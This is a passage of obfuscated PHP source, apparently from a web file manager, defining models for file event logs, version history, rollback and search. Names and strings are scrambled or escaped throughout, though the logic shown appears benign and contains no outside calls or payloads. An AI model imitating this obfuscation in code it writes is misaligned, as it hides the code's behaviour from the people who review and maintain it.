($½ºå¡»º as $¾ú ›‡­ => $Ÿº¢ˆˆ¢) { $Ÿº¢ˆˆ¢ = Action($á¾š¬à[1353])->parsePathChildren($Ÿº¢ˆˆ¢, array($á¾š¬à[421] => $´±ùÃ¹Ä)); $¢óÎÊ‡[$Õáµ¯¤æ][$¾ú ›‡­] = Action($á¾š¬à[1170])->shareItemInfo($Ÿº¢ˆˆ¢); } } return $¢óÎÊ‡; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($¢ Ñ¡›¢) { parent::__construct($¢ Ñ¡›¢); } } goto b„ó×¡¡ƒ; f›õ´‚¯ˆÒ: class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\157\x75\x72\143\145\x5f\145\x76\145\156\x74"; protected $dataAuto = array(array("\x63\x72\145\141\x74\x65\x54\151\155\x65", "\x74\151\155\145", "\151\156\163\x65\162\x74", "\x66\165\x6e\x63\x74\151\157\x6e"), array("\x64\145\x73\143", '', "\x69\156\163\145\x72\164\x2c\165\x70\144\141\164\145\x2c\163\145\x6c\145\143\x74", "\152\163\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($ıÛ¨Ê¨‹, $ÄŒÜ˜å, $ÛåÉîï = '') { $§£„àÉ² =& $_SERVER[­á Ş³Ö]; if (!$this->eventSave) { return; } $ÌÎëÎ = Model($§£„àÉ²[1335])->sourceInfo($ıÛ¨Ê¨‹); if (!$ÌÎëÎ) { return !1; } if ($this->isCacheEvent($ÌÎëÎ, $ÄŒÜ˜å)) { return; } if ($ÛåÉîï && is_string($ÛåÉîï)) { $ÛåÉîï = array($§£„àÉ²[1891] => $ÛåÉîï); } $Ä©öºúü = array($§£„àÉ²[417] => $ıÛ¨Ê¨‹, $§£„àÉ²[2073] => $ÌÎëÎ[$§£„àÉ²[432]], $§£„àÉ²[2074] => $ÌÎëÎ[$§£„àÉ²[32]], $§£„àÉ²[509] => !empty($ÌÎëÎ[$§£„àÉ²[509]]) ? $ÌÎëÎ[$§£„àÉ²[509]] : $§£„àÉ²[12], $§£„àÉ²[1654] => USER_ID, $§£„àÉ²[422] => $ÄŒÜ˜å, $§£„àÉ²[1656] => $ÛåÉîï); $this->addSystemLog($ÄŒÜ˜å, $Ä©öºúü); unset($Ä©öºúü[$§£„àÉ²[2074]], $Ä©öºúü[$§£„àÉ²[509]]); return $this->add($Ä©öºúü); } private function addSystemLog($î³Ô¼‰Ô, $ûÖàÎ) { $ÜÏ‹¾‰ =& $_SERVER[­á Ş³Ö]; if ($î³Ô¼‰Ô == $ÜÏ‹¾‰[2075]) { $î³Ô¼‰Ô = $ûÖàÎ[$ÜÏ‹¾‰[453]][$ÜÏ‹¾‰[2076]]; } else { if (in_array($î³Ô¼‰Ô, array($ÜÏ‹¾‰[1832], $ÜÏ‹¾‰[2077]))) { $î³Ô¼‰Ô = $ûÖàÎ[$ÜÏ‹¾‰[453]][$ÜÏ‹¾‰[751]]; } } $ÓÕÍ¤ŞÜ = array_merge($ûÖàÎ, array($ÜÏ‹¾‰[2078] => $ûÖàÎ[$ÜÏ‹¾‰[402]], $ÜÏ‹¾‰[2079] => $ûÖàÎ[$ÜÏ‹¾‰[2079]])); Hook::trigger($ÜÏ‹¾‰[2080], $ÜÏ‹¾‰[2081] . $î³Ô¼‰Ô, $ûÖàÎ); Model($ÜÏ‹¾‰[1796])->addLog($ÜÏ‹¾‰[2081] . $î³Ô¼‰Ô, $ÓÕÍ¤ŞÜ); } private function isCacheEvent($ùÚïõèÚ, $–‚—¿ÎÇ) { if ($ùÚïõèÚ[$_SERVER[­á Ş³Ö][411]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($Øğ×ù»Ò, $àîœı¼ß) { $ËåëÔŸ¼ =& $_SERVER[­á Ş³Ö]; $ÀÏ¨™´ = Model($ËåëÔŸ¼[1335])->sourceInfo($Øğ×ù»Ò); $»Ô¯«­Ì = array($ËåëÔŸ¼[2076] => $àîœı¼ß, $ËåëÔŸ¼[32] => $ÀÏ¨™´[$ËåëÔŸ¼[32]]); return $this->addEvent($Øğ×ù»Ò, $ËåëÔŸ¼[2075], $»Ô¯«­Ì); } public function eventFileEdit($—¾ã½¿Š) { $Ì‡«Ÿ†¿ =& $_SERVER[­á Ş³Ö]; $—™ôÌÈ = array($Ì‡«Ÿ†¿[2082] => $_SERVER[$Ì‡«Ÿ†¿[2083]], $Ì‡«Ÿ†¿[2084] => strtolower(ACTION)); if (isset($GLOBALS[$Ì‡«Ÿ†¿[7]][$Ì‡«Ÿ†¿[2085]])) { $—™ôÌÈ[$Ì‡«Ÿ†¿[2085]] = $Ì‡«Ÿ†¿[88]; } return $this->addEvent($—¾ã½¿Š, $Ì‡«Ÿ†¿[1822], $—™ôÌÈ); } public function eventRecycle($¡·Òäìõ, $éşì˜ïª) { return $this->addEvent($¡·Òäìõ, $_SERVER[­á Ş³Ö][2077], $éşì˜ïª); } public function eventRemove($ú¹û…©) { $‰²¬šÙ =& $_SERVER[­á Ş³Ö]; $ë®şºÉ = Model($‰²¬šÙ[1335])->sourceInfo($ú¹û…©); $¶Æ±Šº® = $ë®şºÉ[$‰²¬šÙ[32]]; return $this->addEvent($ë®şºÉ[$‰²¬šÙ[432]], $‰²¬šÙ[1821], $¶Æ±Šº®); } public function eventShare($Ş÷ã¹…, $½û²¿ôé) { return $this->addEvent($Ş÷ã¹…, $_SERVER[­á Ş³Ö][1832], $½û²¿ôé); } public function eventMove($€™ÆÂªŒ, $ğ„ˆ±†¦, $ú‚Î¶) { $ì›ÚŠ˜ =& $_SERVER[­á Ş³Ö]; $çîì¤ë× = Model($ì›ÚŠ˜[1335]); $›ëåŠù¡ = $çîì¤ë×->sourceInfo($€™ÆÂªŒ); $ôàƒœÌº = $çîì¤ë×->sourceInfo($ğ„ˆ±†¦); $…Ûñ¬¦ = $çîì¤ë×->sourceInfo($ú‚Î¶); $Ñ¶¢Ìƒõ = array($ì›ÚŠ˜[1156] => $ğ„ˆ±†¦, $ì›ÚŠ˜[2086] => $ôàƒœÌº[$ì›ÚŠ˜[32]], $ì›ÚŠ˜[2064] => !empty($ôàƒœÌº[$ì›ÚŠ˜[509]]) ? $ôàƒœÌº[$ì›ÚŠ˜[509]] : $ì›ÚŠ˜[12], $ì›ÚŠ˜[1157] => $ú‚Î¶, $ì›ÚŠ˜[2087] => $…Ûñ¬¦[$ì›ÚŠ˜[32]], $ì›ÚŠ˜[2088] => !empty($…Ûñ¬¦[$ì›ÚŠ˜[509]]) ? $…Ûñ¬¦[$ì›ÚŠ˜[509]] : $ì›ÚŠ˜[12]); $this->addEvent($€™ÆÂªŒ, $ì›ÚŠ˜[548], $Ñ¶¢Ìƒõ); $›ëåŠù¡ = $çîì¤ë×->sourceInfo($€™ÆÂªŒ); $Ñ¶¢Ìƒõ = array($ì›ÚŠ˜[402] => $›ëåŠù¡[$ì›ÚŠ˜[402]], $ì›ÚŠ˜[32] => $›ëåŠù¡[$ì›ÚŠ˜[32]]); $this->addEvent($ğ„ˆ±†¦, $ì›ÚŠ˜[2089], $Ñ¶¢Ìƒõ); } public function eventCopy($‘€Óï¥í) { $this->eventCreate($‘€Óï¥í, $_SERVER[­á Ş³Ö][546]); } public function eventRename($«•¥ä¯û, $ßšÌ°óŞ, $–·Áõ²Û) { $ïÉÙóµÚ =& $_SERVER[­á Ş³Ö]; $ÁÎÎçµö = array($ïÉÙóµÚ[1156] => $ßšÌ°óŞ, $ïÉÙóµÚ[1157] => $–·Áõ²Û); return $this->addEvent($«•¥ä¯û, $ïÉÙóµÚ[1350], $ÁÎÎçµö); } public function eventAddComment($ƒº“°Šâ, $À³åÀá÷) { return $this->addEvent($ƒº“°Šâ, $_SERVER[­á Ş³Ö][2090], $À³åÀá÷); } public function eventAddDesc($²«…ªûù, $ Ñ‹² ) { return $this->addEvent($²«…ªûù, $_SERVER[­á Ş³Ö][2091], $ Ñ‹² ); } public function listBySource($ÉŒØ®…) { $İâö»£½ =& $_SERVER[­á Ş³Ö]; $ØÓ¤ëç = Model($İâö»£½[1335])->sourceInfo($ÉŒØ®…); $×â×ªö¹ = array($İâö»£½[417] => $ÉŒØ®…); if ($ØÓ¤ëç[$İâö»£½[410]] == $İâö»£½[88]) { $İì¸ì… = Model($İâö»£½[1335])->listSearchChildren($ÉŒØ®…, 20000); $İì¸ì…[] = $ÉŒØ®… . $İâö»£½[378]; $×â×ªö¹ = array($İâö»£½[402] => array($İâö»£½[7], $İì¸ì…)); } $ÃÂ¡óò = $this->where($×â×ªö¹)->order($İâö»£½[2092])->selectPage(); if ($ÃÂ¡óò[$İâö»£½[366]][$İâö»£½[367]] == 0) { $ÃÂ¡óò[$İâö»£½[366]][$İâö»£½[367]] = 1; $ÃÂ¡óò[$İâö»£½[369]] = array(array($İâö»£½[417] => $ÉŒØ®…, $İâö»£½[2073] => $ØÓ¤ëç[$İâö»£½[432]], $İâö»£½[1654] => $ØÓ¤ëç[$İâö»£½[454]], $İâö»£½[422] => $İâö»£½[2093], $İâö»£½[423] => $ØÓ¤ëç[$İâö»£½[201]], $İâö»£½[1656] => $İâö»£½[12])); } return $this->eventListParse($ÃÂ¡óò, $ÉŒØ®…); } private function eventListParse($–¿†™ä, $‹¹‡ø) { $ Ä–Òßâ =& $_SERVER[­á Ş³Ö]; $Ö³æ·€ = $–¿†™ä[$ Ä–Òßâ[369]]; $¿‘»Š×¬ = array_to_keyvalue($Ö³æ·€, $ Ä–Òßâ[12], $ Ä–Òßâ[402]); $öÉ©ûòÀ = array_to_keyvalue($Ö³æ·€, $ Ä–Òßâ[12], $ Ä–Òßâ[2079]); foreach ($Ö³æ·€ as $”ûêÍ) { $‚Ê”Å£ = $”ûêÍ[$ Ä–Òßâ[453]]; if ($”ûêÍ[$ Ä–Òßâ[33]] == $ Ä–Òßâ[548] && isset($‚Ê”Å£[$ Ä–Òßâ[1156]])) { $¿‘»Š×¬[] = $‚Ê”Å£[$ Ä–Òßâ[1156]] . $ Ä–Òßâ[12]; $¿‘»Š×¬[] = $‚Ê”Å£[$ Ä–Òßâ[1157]] . $ Ä–Òßâ[12]; } if ($”ûêÍ[$ Ä–Òßâ[33]] == $ Ä–Òßâ[2089] && isset($‚Ê”Å£[$ Ä–Òßâ[402]])) { $¿‘»Š×¬[] = $‚Ê”Å£[$ Ä–Òßâ[402]] . $ Ä–Òßâ[12]; } } $¿‘»Š×¬ = array_merge($¿‘»Š×¬, $öÉ©ûòÀ, array($‹¹‡ø . $ Ä–Òßâ[12])); $¿‘»Š×¬ = array_unique($¿‘»Š×¬); $¾Øî‚ñÑ = array_unique(array_to_keyvalue($Ö³æ·€, $ Ä–Òßâ[12], $ Ä–Òßâ[1663])); $¹ÀÒÑî¥ = Model($ Ä–Òßâ[525])->userListInfo($¾Øî‚ñÑ); $îˆÕãî• = Model($ Ä–Òßâ[822])->sourceListInfo($¿‘»Š×¬, !0); foreach ($Ö³æ·€ as &$”ûêÍ) { if ($”ûêÍ[$ Ä–Òßâ[33]] == $ Ä–Òßâ[548] && isset($”ûêÍ[$ Ä–Òßâ[453]][$ Ä–Òßâ[1156]])) { $”ûêÍ[$ Ä–Òßâ[453]][$ Ä–Òßâ[1156]] = $îˆÕãî•[$”ûêÍ[$ Ä–Òßâ[453]][$ Ä–Òßâ[1156]]]; $”ûêÍ[$ Ä–Òßâ[453]][$ Ä–Òßâ[1157]] = $îˆÕãî•[$”ûêÍ[$ Ä–Òßâ[453]][$ Ä–Òßâ[1157]]]; } if ($”ûêÍ[$ Ä–Òßâ[33]] == $ Ä–Òßâ[2089] && isset($”ûêÍ[$ Ä–Òßâ[453]][$ Ä–Òßâ[402]])) { $”ûêÍ[$ Ä–Òßâ[453]][$ Ä–Òßâ[402]] = $îˆÕãî•[$”ûêÍ[$ Ä–Òßâ[453]][$ Ä–Òßâ[402]]]; } $”ûêÍ[$ Ä–Òßâ[87]] = $îˆÕãî•[$”ûêÍ[$ Ä–Òßâ[402]]]; $”ûêÍ[$ Ä–Òßâ[2094]] = $îˆÕãî•[$”ûêÍ[$ Ä–Òßâ[2079]]]; if ($”ûêÍ[$ Ä–Òßâ[33]] == $ Ä–Òßâ[1821]) { $”ûêÍ[$ Ä–Òßâ[2094]] = $”ûêÍ[$ Ä–Òßâ[87]]; $”ûêÍ[$ Ä–Òßâ[2079]] = $”ûêÍ[$ Ä–Òßâ[2094]][$ Ä–Òßâ[402]]; $”ûêÍ[$ Ä–Òßâ[87]] = !1; $”ûêÍ[$ Ä–Òßâ[402]] = $ Ä–Òßâ[12]; } $”ûêÍ[$ Ä–Òßâ[2024]] = $¹ÀÒÑî¥[$”ûêÍ[$ Ä–Òßâ[1663]]]; } unset($”ûêÍ); $–¿†™ä[$ Ä–Òßâ[369]] = $Ö³æ·€; return $–¿†™ä; } public function removeBySource($ú¨²“Êˆ) { $«ÃŸĞ»’ = array($_SERVER[­á Ş³Ö][417] => $ú¨²“Êˆ); $this->where($«ÃŸĞ»’)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\x6f\165\x72\143\145\x5f\150\151\163\x74\157\x72\x79"; public function historyCount($¸Ò‘º…½) { $ŞŸ¸èÕ… =& $_SERVER[­á Ş³Ö]; if (!$¸Ò‘º…½) { return array(); } if (is_string($¸Ò‘º…½) || is_int($¸Ò‘º…½)) { $¸Ò‘º…½ = array($¸Ò‘º…½); } $î‘ü÷è÷ = array($ŞŸ¸èÕ…[402], $ŞŸ¸èÕ…[1885] => $ŞŸ¸èÕ…[491]); $û«ÍçÚø = array($ŞŸ¸èÕ…[402] => array($ŞŸ¸èÕ…[7], $¸Ò‘º…½)); $ÁÚğÖ¦ = $this->field($î‘ü÷è÷)->where($û«ÍçÚø)->group($ŞŸ¸èÕ…[402])->select(); return array_to_keyvalue($ÁÚğÖ¦, $ŞŸ¸èÕ…[402], $ŞŸ¸èÕ…[491]); } public function addHistory($²É¨â¬Ã, $ß Øê ˜ = '') { $”œÛŞŞÕ =& $_SERVER[­á Ş³Ö]; $©Ÿ÷ÔË = array($”œÛŞŞÕ[417] => $²É¨â¬Ã[$”œÛŞŞÕ[402]], $”œÛŞŞÕ[1654] => isset($²É¨â¬Ã[$”œÛŞŞÕ[456]]) ? $²É¨â¬Ã[$”œÛŞŞÕ[456]] : $²É¨â¬Ã[$”œÛŞŞÕ[454]], $”œÛŞŞÕ[469] => $²É¨â¬Ã[$”œÛŞŞÕ[468]], $”œÛŞŞÕ[545] => $²É¨â¬Ã[$”œÛŞŞÕ[76]], $”œÛŞŞÕ[2095] => $ß Øê ˜); if ($GLOBALS[$”œÛŞŞÕ[6]][$”œÛŞŞÕ[89]][$”œÛŞŞÕ[1213]] >= 1) { $this->historyAutoClear($©Ÿ÷ÔË[$”œÛŞŞÕ[402]]); $this->add($©Ÿ÷ÔË); } Hook::trigger($”œÛŞŞÕ[2096], $©Ÿ÷ÔË); Model($”œÛŞŞÕ[2097])->eventFileEdit($²É¨â¬Ã[$”œÛŞŞÕ[402]]); } private function historyAutoClear($³°¸¯ÀÛ) { $‘‹ÒÚúß =& $_SERVER[­á Ş³Ö]; $ŠÈíºå° = Model($‘‹ÒÚúß[767])->get($‘‹ÒÚúß[1235]); $ÖÉá¥Œ = $GLOBALS[$‘‹ÒÚúß[6]][$‘‹ÒÚúß[89]][$‘‹ÒÚúß[1213]]; $Ê”û½ø = $ŠÈíºå° == $‘‹ÒÚúß[1236] ? min(5, $ÖÉá¥Œ) : $ÖÉá¥Œ; $Ê”û½ø = $Ê”û½ø <= 0 ? 0 : $Ê”û½ø - 1; if ($Ê”û½ø >= 500) { return; } $õ™ğ‡ïâ = array($‘‹ÒÚúß[417] => $³°¸¯ÀÛ); $ğï˜—Øñ = $this->field($‘‹ÒÚúß[2098])->where($õ™ğ‡ïâ)->order($‘‹ÒÚúß[2092])->select(); if (!$ğï˜—Øñ || $Ê”û½ø >= count($ğï˜—Øñ)) { return; } $®°åŠ˜ü = array_to_keyvalue($ğï˜—Øñ, $‘‹ÒÚúß[12], $‘‹ÒÚúß[399]); $®°åŠ˜ü = array_slice($®°åŠ˜ü, $Ê”û½ø); $íÅÍÄÑ… = array_to_keyvalue($ğï˜—Øñ, $‘‹ÒÚúß[12], $‘‹ÒÚúß[468]); $íÅÍÄÑ… = array_slice($íÅÍÄÑ…, $Ê”û½ø); if (!$®°åŠ˜ü || !$íÅÍÄÑ…) { return; } $õ™ğ‡ïâ = array($‘‹ÒÚúß[419] => array($‘‹ÒÚúß[7], $®°åŠ˜ü)); $this->where($õ™ğ‡ïâ)->delete(); Model($‘‹ÒÚúß[471])->remove($íÅÍÄÑ…); } public function listData($±³µ³ÇÊ) { $Ãüè¬É  =& $_SERVER[­á Ş³Ö]; $–§á„€¤ = array($Ãüè¬É [417] => $±³µ³ÇÊ); $´êÎÛØ = $Ãüè¬É [2099]; $¶†ïîÌ£ = $this->field($´êÎÛØ)->where($–§á„€¤)->order($Ãüè¬É [2092])->selectPage(); $this->_listAppendUser($¶†ïîÌ£[$Ãüè¬É [369]]); $öıÆ –¶ = Model($Ãüè¬É [767])->get($Ãüè¬É [1235]); $‚°ÜœËŠ = 5; if ($öıÆ –¶ == $Ãüè¬É [1236]) { $¶†ïîÌ£[$Ãüè¬É [369]] = array_slice($¶†ïîÌ£[$Ãüè¬É [369]], 0, $‚°ÜœËŠ); $¶†ïîÌ£[$Ãüè¬É [366]] = array($Ãüè¬É [2100] => 1, $Ãüè¬É [2101] => 20, $Ãüè¬É [2102] => 1, $Ãüè¬É [2103] => count($¶†ïîÌ£[$Ãüè¬É [369]])); } return $¶†ïîÌ£; } protected function _listAppendUser(&$²à­»«è) { $ê§ÌøÄµ =& $_SERVER[­á Ş³Ö]; $… …·ö¨ = array_to_keyvalue($²à­»«è, $ê§ÌøÄµ[12], $ê§ÌøÄµ[1663]); $¡¡†Íå = Model($ê§ÌøÄµ[525])->userListInfo($… …·ö¨); foreach ($²à­»«è as &$ê›Á”ÎÛ) { $µ¶ÊíÚÛ = $ê›Á”ÎÛ[$ê§ÌøÄµ[1663]]; $ê›Á”ÎÛ[$ê§ÌøÄµ[454]] = $¡¡†Íå[$µ¶ÊíÚÛ] ? $¡¡†Íå[$µ¶ÊíÚÛ] : !1; } unset($ê›Á”ÎÛ); } public function fileInfo($–Öé•é) { $ê¬ŸóŞí =& $_SERVER[­á Ş³Ö]; $îöÀé¿ = $this->tablePrefix; $í¿¯Êø = "{$îöÀé¿}\x69\157\137\x66\x69\x6c\x65\x20\146\x69\154\x65\163\x20\157\156\40\x66\x69\x6c\145\163\56\146\x69\x6c\145\x49\x44\x20\75\x20\x68\151\x73\164\x6f\x72\x79\56\x66\x69\x6c\x65\111\x44"; return $this->alias($ê¬ŸóŞí[2104])->where(array($ê¬ŸóŞí[419] => $–Öé•é))->join($í¿¯Êø, $ê¬ŸóŞí[2105])->find(); } public function removeItem($˜¬¾óØ¹) { $õû—›‚£ =& $_SERVER[­á Ş³Ö]; $áú‡Ê«¿ = array($õû—›‚£[419] => $˜¬¾óØ¹); $í­»ÂÒµ = $this->where($áú‡Ê«¿)->find(); if ($í­»ÂÒµ) { $£ÔúÔ° = $this->where($áú‡Ê«¿)->delete(); Model($õû—›‚£[471])->remove($í­»ÂÒµ[$õû—›‚£[468]]); return $£ÔúÔ°; } return !1; } public function removeBySource($àÔšßÇ) { $Š›ŠÑÙ =& $_SERVER[­á Ş³Ö]; if (!$àÔšßÇ) { return !1; } if (!is_array($àÔšßÇ)) { $àÔšßÇ = array($àÔšßÇ); } $à“–¦¼‡ = array($Š›ŠÑÙ[417] => array($Š›ŠÑÙ[7], $àÔšßÇ)); $ÙàÑİ» = $this->field($Š›ŠÑÙ[469])->where($à“–¦¼‡)->select(); if ($ÙàÑİ») { $this->where($à“–¦¼‡)->delete(); $ç‚Áº‰Ø = array_to_keyvalue($ÙàÑİ», $Š›ŠÑÙ[12], $Š›ŠÑÙ[468]); Model($Š›ŠÑÙ[471])->remove($ç‚Áº‰Ø); } return !0; } public function setDetail($‹¢¶Öóí, $Í•¡Ì±) { $¦ïáŞ— =& $_SERVER[­á Ş³Ö]; return $this->where(array($¦ïáŞ—[419] => $‹¢¶Öóí))->save(array($¦ïáŞ—[2095] => $Í•¡Ì±)); } public function rollbackToItem($Ÿ¬íçŸæ, $¬¨„“†¡) { $ˆæøÍŠÙ =& $_SERVER[­á Ş³Ö]; $Øàä³À = Model($ˆæøÍŠÙ[822])->sourceInfo($Ÿ¬íçŸæ); $this->addHistory($Øàä³À, LNG($ˆæøÍŠÙ[2106])); $í•æ‹æÉ = $this->find($¬¨„“†¡); $–»¾¼ù“ = array($ˆæøÍŠÙ[468] => $í•æ‹æÉ[$ˆæøÍŠÙ[468]], $ˆæøÍŠÙ[76] => $í•æ‹æÉ[$ˆæøÍŠÙ[76]], $ˆæøÍŠÙ[85] => time(), $ˆæøÍŠÙ[456] => USER_ID); Model($ˆæøÍŠÙ[822])->where(array($ˆæøÍŠÙ[402] => $Ÿ¬íçŸæ))->save($–»¾¼ù“); return $this->where(array($ˆæøÍŠÙ[419] => $¬¨„“†¡))->delete(); } public function clearSame($æõ¸Şà ) { $ê¸ıÜÑù =& $_SERVER[­á Ş³Ö]; $ß§’ÙÂ‹ = $this->listData($æõ¸Şà ); $åÎùéëô = array_to_keyvalue_group($ß§’ÙÂ‹, $ê¸ıÜÑù[468]); $˜ŒÍ­õ = array(); $¢”§şšÑ = array(); foreach ($åÎùéëô as $Õ¥¥åÙ…) { if (!$Õ¥¥åÙ… || count($Õ¥¥åÙ…) <= 1) { continue; } foreach ($Õ¥¥åÙ… as $² —ğãŸ) { $˜ŒÍ­õ[] = $² —ğãŸ[$ê¸ıÜÑù[468]]; $¢”§şšÑ[] = $² —ğãŸ[$ê¸ıÜÑù[399]]; } } if (!$¢”§şšÑ) { return; } $this->where(array($ê¸ıÜÑù[399] => array($ê¸ıÜÑù[7], $¢”§şšÑ)))->delete(); Model($ê¸ıÜÑù[471])->remove($˜ŒÍ­õ); } public function userSpace() { $ÙÏ«…ÄÒ =& $_SERVER[­á Ş³Ö]; $ïã²µ—¸ = $this->tablePrefix; $¯ã™ï­Ğ = array($ÙÏ«…ÄÒ[1654] => USER_ID); $§ŞÁ’ï = "{$ïã²µ—¸}\151\x6f\x5f\146\151\x6c\x65\x20\x66\x69\x6c\145\163\40\157\x6e\40\146\x69\x6c\145\163\56\x66\x69\154\145\111\x44\40\75\40\x68\151\x73\164\157\162\x79\56\146\x69\154\x65\x49\x44"; return $this->alias($ÙÏ«…ÄÒ[2104])->where($¯ã™ï­Ğ)->join($§ŞÁ’ï, $ÙÏ«…ÄÒ[2105])->sum($ÙÏ«…ÄÒ[76]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($ÁİåÉÈ—) { $°½÷ß²á =& $_SERVER[­á Ş³Ö]; $¥Ş˜™İß = KodIO::fileTypeList(); $Áı·‚¥£ = $¥Ş˜™İß[$ÁİåÉÈ—]; if (!$Áı·‚¥£) { return array(); } $ÎŠ…–Çº = $Áı·‚¥£[$°½÷ß²á[174]]; $ÎóÙ³Ø = $°½÷ß²á[7]; if (!$Áı·‚¥£[$°½÷ß²á[174]]) { $‰òÂÒ¦Â = array_to_keyvalue($¥Ş˜™İß, $°½÷ß²á[12], $°½÷ß²á[174]); $ÎŠ…–Çº = implode($°½÷ß²á[50], $‰òÂÒ¦Â); $ÎóÙ³Ø = $°½÷ß²á[2107]; } $‘™¦” = explode($°½÷ß²á[50], trim($ÎŠ…–Çº, $°½÷ß²á[50])); return array($ÎóÙ³Ø, $‘™¦”); } public function listPathType($ø†ÎÁŞ˜) { $¿ÛØşŞ =& $_SERVER[­á Ş³Ö]; $ßŸ‰µ‘Ó = $this->fileTypeWhere($ø†ÎÁŞ˜); if (!$ßŸ‰µ‘Ó) { return array(); } $ü…Îµµò = USER_ID; $øŒ»Ä¨˜ = Model($¿ÛØşŞ[525])->getInfo($ü…Îµµò); $Ôˆ¸ã” = array($¿ÛØşŞ[576] => SourceModel::TYPE_USER, $¿ÛØşŞ[511] => array($¿ÛØşŞ[540], $¿ÛØşŞ[521] . $øŒ»Ä¨˜[$¿ÛØşŞ[87]][$¿ÛØşŞ[402]] . $¿ÛØşŞ[541]), $¿ÛØşŞ[577] => $ü…Îµµò, $¿ÛØşŞ[574] => 0, $¿ÛØşŞ[575] => $ßŸ‰µ‘Ó); return $this->listSource($Ôˆ¸ã”); } public function listSearch($§‰¡«¯º, $À·°—âÒ = 300) { $¯¶˜í =& $_SERVER[­á Ş³Ö]; if (isset($§‰¡«¯º[$¯¶˜í[1946]]) && $§‰¡«¯º[$¯¶˜í[1946]]) { $§‰¡«¯º[$¯¶˜í[1946]] = str_replace($¯¶˜í[384], $¯¶˜í[2108], trim($§‰¡«¯º[$¯¶˜í[1946]])); } $³ˆ¼ŞùØ = $this->_parseSearchWhere($§‰¡«¯º); if (!isset($³ˆ¼ŞùØ[$¯¶˜í[431]])) { $³ˆ¼ŞùØ[$¯¶˜í[431]] = 0; } $ÇøêÑ = $¯¶˜í[2109]; $ÑÒ‚äÜ = $³ˆ¼ŞùØ; $‘ÖËµ¿Å = $ÇøêÑ; $this->_listSearchBindPinyin($§‰¡«¯º, $³ˆ¼ŞùØ, $ÇøêÑ); $this->alias($¯¶˜í[446])->_makeOrder(); $³ˆ¼ŞùØ = $this->parseWhereLike($³ˆ¼ŞùØ); $×çÊÏøÃ = $this->distinct(!0)->field($ÇøêÑ)->where($³ˆ¼ŞùØ)->selectPage($À·°—âÒ); if ($GLOBALS[$¯¶˜í[6]][$¯¶˜í[381]][$¯¶˜í[382]] && Input::check($§‰¡«¯º[$¯¶˜í[1946]], $¯¶˜í[583]) && $×çÊÏøÃ[$¯¶˜í[366]][$¯¶˜í[353]] == 1 && $×çÊÏøÃ[$¯¶˜í[366]][$¯¶˜í[367]] == 0) { $×çÊÏøÃ = $this->distinct(!0)->field($ÇøêÑ)->where($ÑÒ‚äÜ)->limit(1000)->select(); $×çÊÏøÃ = array_page_split($×çÊÏøÃ, !1, $À·°—âÒ); } $this->_listSearchFileContent($×çÊÏøÃ, $§‰¡«¯º, $‘ÖËµ¿Å, $ÑÒ‚äÜ); $this->_listSearchDesc($×çÊÏøÃ, $§‰¡«¯º, $‘ÖËµ¿Å); $this->_listSearchTag($×çÊÏøÃ, $§‰¡«¯º, $‘ÖËµ¿Å); $this->_listSearchGroupTag($×çÊÏøÃ, $§‰¡«¯º, $‘ÖËµ¿Å); $this->_listDataApply($×çÊÏøÃ[$¯¶˜í[369]]); $this->_listMake($×çÊÏøÃ); return $×çÊÏøÃ; } private function _listSearchFileContent(&$Áà‚Û‹, $âè¯ĞƒÍ, $–­ı±Ëà, $±àğßÚî) { $¿¨æµ¶‘ =& $_SERVER[­á Ş³Ö]; if (!$âè¯ĞƒÍ[$¿¨æµ¶‘[1946]] || $Áà‚Û‹[$¿¨æµ¶‘[366]][$¿¨æµ¶‘[353]] > 1) { return; } if (!isset($±àğßÚî[$¿¨æµ¶‘[32]]) || !is_array($âè¯ĞƒÍ[$¿¨æµ¶‘[468]])) { return; } $±àğßÚî[$¿¨æµ¶‘[468]] = array($¿¨æµ¶‘[7], $âè¯ĞƒÍ[$¿¨æµ¶‘[468]]); unset($±àğßÚî[$¿¨æµ¶‘[32]]); unset($âè¯ĞƒÍ[$¿¨æµ¶‘[468]]); $¬†Œş = $this->field($–­ı±Ëà)->where($±àğßÚî)->limit($¿¨æµ¶‘[2110])->select(); if (!$¬†Œş || count($¬†Œş) == 0) { return; } $Áà‚Û‹[$¿¨æµ¶‘[369]] = array_merge($¬†Œş, $Áà‚Û‹[$¿¨æµ¶‘[369]]); $Áà‚Û‹[$¿¨æµ¶‘[366]][$¿¨æµ¶‘[367]] += count($¬†Œş); } private function _listSearchTag(&$•îŸ£¶­, $ñæô²Ì, $¥Ÿ˜¨Ò) { $—¿¤£í =& $_SERVER[­á Ş³Ö]; if (!$ñæô²Ì[$—¿¤£í[1946]] || $•îŸ£¶­[$—¿¤£í[366]][$—¿¤£í[353]] > 1) { return; } $áÑ³Ë—ú = Model($—¿¤£í[2111])->listData(); $úËíª÷Ü = array(); $Ë‡²÷¸™ = $ñæô²Ì[$—¿¤£í[1946]]; foreach ($áÑ³Ë—ú as $Ï¢®î¤¥) { $û¢®‹èÅ = $Ï¢®î¤¥[$—¿¤£í[32]]; $ó±™€ÏÚ = str_replace($—¿¤£í[53], $—¿¤£í[12], Pinyin::get($û¢®‹èÅ)); if (stripos($û¢®‹èÅ, $Ë‡²÷¸™) !== !1 || stripos($ó±™€ÏÚ, $Ë‡²÷¸™) !== !1) { $úËíª÷Ü[] = $Ï¢®î¤¥[$—¿¤£í[399]]; } } if (!$úËíª÷Ü) { return; } $‡­î×¯¼ = array($—¿¤£í[426] => array($—¿¤£í[7], $úËíª÷Ü), $—¿¤£í[1663] => USER_ID); $˜õêéå = Model($—¿¤£í[428])->field($—¿¤£í[84])->where($‡­î×¯¼)->select(); $˜õêéå = array_to_keyvalue($˜õêéå, $—¿¤£í[12], $—¿¤£í[84]); $€°ÍÏğ¿ = array_unique($˜õêéå); $this->_listSearchMerge($•îŸ£¶­, $ñæô²Ì, $¥Ÿ˜¨Ò, $€°ÍÏğ¿); } private function _listSearchDesc(&$Á”²üæ, $Ù‡Í«Ü’, $—Ç€âê‰) { $†¯şŸ‚ =& $_SERVER[­á Ş³Ö]; if (!$Ù‡Í«Ü’[$†¯şŸ‚[1946]] || $Á”²üæ[$†¯şŸ‚[366]][$†¯şŸ‚[353]] > 1) { return; } $î£€Áú’ = array($†¯şŸ‚[94] => 